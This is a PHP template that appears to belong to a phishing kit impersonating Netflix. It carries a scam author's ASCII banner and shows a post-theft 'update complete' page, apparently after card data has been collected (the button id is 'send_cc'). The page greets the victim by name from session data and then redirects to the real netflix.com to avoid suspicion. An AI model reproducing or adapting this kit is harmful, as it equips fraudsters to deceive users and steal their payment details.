<?php
/* 
  _   _   _____         _                  _                          
 | | | | |  ___|       | |   __ _    ___  | | __  ___    ___    _ __  
 | |_| | | |_       _  | |  / _` |  / __| | |/ / / __|  / _ \  | '_ \ 
 |  _  | |  _|     | |_| | | (_| | | (__  |   <  \__ \ | (_) | | | | |
 |_| |_| |_|        \___/   \__,_|  \___| |_|\_\ |___/  \___/  |_| |_|

  __  __                         _                    _            __          __  _____   ______
 |  \/  |                       | |                  | |           \ \        / / |_   _| |___  /
 | \  / |   ___    _   _   ___  | |_    __ _    ___  | |__     ___  \ \  /\  / /    | |      / / 
 | |\/| |  / _ \  | | | | / __| | __|  / _` |  / __| | '_ \   / _ \  \ \/  \/ /     | |     / /  
 | |  | | | (_) | | |_| | \__ \ | |_  | (_| | | (__  | | | | |  __/   \  /\  /     _| |_   / /__ 
 |_|  |_|  \___/   \__,_| |___/  \__|  \__,_|  \___| |_| |_|  \___|    \/  \/     |_____| /_____|
                                                                                                                      
                                                                            

*/
/*==============[Lange_CounTry]=================*/
session_start();
include('../boot.php');	
include('../inc/lang.php');	
include "../inc/lang".$_SESSION['HF-JAckson'];
$HF_V = $_SESSION['country_name'];
/*===============[Code_HTML]====================*/
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8" />
	<title><?php echo $Fartout;?> <?php echo $HF_V;?>-<?php echo $scss;?></title>
	<link rel="shortcut icon" href="../Files/img/icon.ico"/>
	<link rel="stylesheet" type="text/css" href="../Files/css/bil.css">
	<style type="text/css" media="screen">
    .has-error input {
      border-width: 1px;
    }

    .validation.text-danger:after {
      content: 'Validation failed';
    }

    .validation.text-success:after {
      content: 'Validation passed';
    }
    .has-error .checkbox, .has-error .checkbox-inline, .has-error .control-label, .has-error .help-block, .has-error .radio, .has-error .radio-inline, .has-error.checkbox label, .has-error.checkbox-inline label, .has-error.radio label, .has-error.radio-inline label 
    {
          color: #a94442;
    }

    .has-error .form-control
    {
          box-shadow: inset 0 1px 1px rgba(0,0,0,.075);
          border:2px solid #a94442;
    }
   .HF_Card {
    display: inline-block;
    background-image: url("http://i.imgur.com/NJHG6g5.png");
    background-repeat: no-repeat;
    background-position: 0px -406px;
    height: 27px;
    position: absolute;
    top: 370px;
    left: 1049px;
    width: 40px;
}
  </style>
</head>
<body>


   <div class="wrapp">

   	<header>
   		<div class="logo">
   			<img src="../Files/img/o.svg.png">
   		</div>
   		<div class="tbat">
   			<a href="#"><?php echo $khoroj;?></a>
   		</div>
   	</header>

   	<div class="bil">
   	  <div class="set">
   	  	<div class="lawal">
   	  	    <center><h1><?php echo $upd;?></h1></center>
   	  	</div>
   	  	<div class="bil_form">
   	  		<form action="https://www.netflix.com/browse" method="post">
<center>
<img src="../Files/img/lol.png" height="70px" width="70px">
		</center>
		<div class="lawal">
	     <center>
		<h3 style="color:#504444"><?php echo $_SESSION['f_name'];?></h3>
		<h5 style="color:#864848"><?php echo $txt;?></h5>
		</center>
		</div>
				<input type="submit" name="sbt" value="<?php echo $final;?>" id="send_cc">
   	  		</form>
   	  	</div>
   	  </div>	
   	</div>

   </div>

   <footer>
          <div class="wrapp">
               <div class="lawal">
                    <a href="#"><?php echo $so2al;?> <?php echo $cnt;?></a>
               </div>
               <div class="tani">
                    <ul>
                         <li>
                              <a href="">
                                   <span><?php echo $src;?></span>
                              </a>
                         </li>
                         <li>
                              <a href="">
                                   <span><?php echo $tem;?></span>
                              </a>
                         </li>
                         <li>
                              <a href="">
                                   <span><?php echo $prv;?></span>
                              </a>
                         </li>
                    </ul>
               </div>
          </div>     
          </footer>
</body>
</html>
<?php
 echo "<META HTTP-EQUIV='Refresh' Content=5;URL='https://www.netflix.com/browse'>";
?>